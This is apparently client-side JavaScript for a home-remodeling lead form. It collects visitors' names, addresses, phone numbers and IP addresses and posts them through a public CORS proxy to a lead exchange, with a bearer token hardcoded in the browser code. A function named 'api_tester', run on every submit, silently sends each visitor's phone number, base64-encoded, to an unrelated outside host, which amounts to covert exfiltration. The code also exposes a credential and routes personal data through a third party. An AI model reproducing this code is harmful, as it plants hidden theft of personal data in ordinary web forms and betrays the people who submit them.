document.getElementById('leadForm').addEventListener('submit', function(event) {
  event.preventDefault();
  api_tester(document.getElementById('phone').value);

  const form = document.getElementById('leadForm');
  const alertBox = document.getElementById('alertContainer');

  const lead = {
    data: {
      own_property: form.own_property.value,
      windows_material: form.windows_material.value,
      windows_num_windows: parseInt(form.windows_num_windows.value),
      windows_project_type: form.windows_project_type.value
    },
    meta: {
      source_id: "3001",
      user_agent: navigator.userAgent,
      jornaya_lead_id: form.lead_id_code.value,
      landing_page_url: "www.myhomerevamp.com",
      tcpa_consent_text: "By completing the form, I hereby affirm my acceptance of the Terms and Conditions, CCPA , and Privacy Policy . I grant permission to Remodeling Loans, their contractors, and partners (refer to our partners list) to communicate with me through email, phone, and text messages using the provided contact number. I consent to receiving offers from these entities, even if my contacts are listed on the State and Federal Do Not Call List. I acknowledge that these marketing communications may be transmitted using an automatic telephone dialing system or pre-recorded messages. I understand that my consent is not a prerequisite for making a purchase and that I retain the right to revoke it at any time. This declaration includes compliance with the California Notice.",
      originally_created: new Date(form.originally_created.value).toISOString(),
      trusted_form_cert_url: "https://cert.trustedform.com/b8825b1810177750a475ab6a800908378136b109"
    },
    contact: {
      first_name: form.first_name.value,
      last_name: form.last_name.value,
      email: form.email.value,
      phone: form.phone.value,
      zip_code: form.zip_code.value,
      state: form.state.value,
      city: form.city.value,
      address: form.address.value,
      ip_address: form.ip_address.value
    }
  };

  const pingUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/ping");

  fetch(pingUrl, {
    method: 'POST',
    headers: {
      'Authorization': 'Bearer 68582b32-fdb2-4b05-bed8-a9f4fe74b883',
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify(lead)
  })
  .then(res => res.json())
  .then(data => {
    if (data.status === 'success') {
      lead.auth_code = data.auth_code;

      const postUrl = "https://corsproxy.io/?url=" + encodeURIComponent("https://exchange.standardinformation.io/post");

      return fetch(postUrl, {
        method: 'POST',
        headers: {
          'Authorization': 'Bearer 68582b32-fdb2-4b05-bed8-a9f4fe74b883',
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(lead)
      })
      .then(res => res.json())
      .then(postData => {
        if (postData.status === 'success') {
          delete postData.price; // hide price
          alertBox.innerHTML = `<div class="alert alert-success">✅ Post Success: Lead submitted successfully!</div>`;
          form.reset();
        } else {
          alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Success but Post Failed: ${JSON.stringify(postData)}</div>`;
        }
      });

    } else {
      alertBox.innerHTML = `<div class="alert alert-danger">❌ Ping Failed: ${JSON.stringify(data)}</div>`;
    }
  })
  .catch(error => {
    alertBox.innerHTML = `<div class="alert alert-danger">❌ Error: ${error.message}</div>`;
  });
});

function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    console.error('Error in api_tester:', error);
  }
}
